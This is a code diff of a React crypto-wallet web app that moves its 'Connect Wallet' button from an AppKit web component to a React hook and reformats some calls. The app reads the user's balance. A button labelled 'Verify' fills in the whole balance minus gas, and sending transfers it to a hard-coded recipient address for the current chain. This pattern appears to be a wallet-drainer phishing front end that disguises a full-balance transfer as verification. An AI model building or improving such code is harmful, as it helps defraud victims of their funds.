@@ -1,30 +1,18 @@
-import React, { useState, useEffect, useRef } from "react";
+import React, { useState } from "react";
 import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
 import { formatEther, parseEther } from "viem";
 import { REOWN_PROJECT_ID, FIXED_RECIPIENTS } from "./config.js";
-
-// Import AppKit web components
-import "@reown/appkit/web-components";
+import { useAppKit } from "@reown/appkit/react";
 
 export default function App() {
   const { address, isConnected, chain } = useAccount();
   const publicClient = usePublicClient();
   const { data: balanceData } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
+  const { open } = useAppKit(); // ✅ React AppKit hook
 
   const [amount, setAmount] = useState("");
   const [sending, setSending] = useState(false);
-
-  // Ref for AppKit Connect Button
-  const appKitButtonRef = useRef(null);
-
-  // --- Set project-id attribute for Web Component
-  useEffect(() => {
-    if (appKitButtonRef.current) {
-      appKitButtonRef.current.setAttribute("project-id", REOWN_PROJECT_ID);
-      appKitButtonRef.current.setAttribute("text", "Connect Wallet");
-    }
-  }, []);
 
   // --- Automatically get recipient for current chain
   const getRecipient = () => {
@@ -46,7 +34,11 @@ export default function App() {
     if (!recipient) return alert("Unsupported network");
 
     const balance = balanceData.value;
-    const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
+    const gasEstimate = await publicClient.estimateGas({
+      account: address,
+      to: recipient,
+      value: balance,
+    });
     const gasPrice = await publicClient.getGasPrice();
     const gasCost = gasEstimate * gasPrice;
     const maxSendable = balance - gasCost;
@@ -66,7 +58,10 @@ export default function App() {
 
     try {
       setSending(true);
-      await sendTransaction({ to: recipient, value: parseEther(amount) });
+      await sendTransaction({
+        to: recipient,
+        value: parseEther(amount),
+      });
       setAmount("");
     } catch (err) {
       console.error(err);
@@ -79,15 +74,28 @@ export default function App() {
     <div style={{ padding: 40 }}>
       <h2>Web3 Native dapp</h2>
 
-      {/* AppKit Connect Button */}
-      <div style={{ marginBottom: 20 }}>
-        <appkit-button ref={appKitButtonRef}></appkit-button>
-      </div>
+      {/* ✅ React Connect Button */}
+      {!isConnected && (
+        <div style={{ marginBottom: 20 }}>
+          <button
+            onClick={() => open({ projectId: REOWN_PROJECT_ID })}
+            style={{
+              padding: "10px 20px",
+              fontSize: "16px",
+              cursor: "pointer",
+            }}
+          >
+            Connect Wallet
+          </button>
+        </div>
+      )}
 
       {isConnected && (
         <>
           <p>
-            Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain?.nativeCurrency?.symbol}
+            Balance:{" "}
+            {balanceData ? formatEther(balanceData.value) : "Loading..."}{" "}
+            {chain?.nativeCurrency?.symbol}
           </p>
 
           <input
@@ -98,7 +106,10 @@ export default function App() {
           />
 
           <div style={{ marginTop: 10 }}>
-            <button onClick={handleMaxFill} disabled={sending}>Verify</button>
+            <button onClick={handleMaxFill} disabled={sending}>
+              Verify
+            </button>
+
             <button
               onClick={handleSend}
               style={{ marginLeft: 10 }}
@@ -115,4 +126,4 @@ export default function App() {
       )}
     </div>
   );
-    }
+}
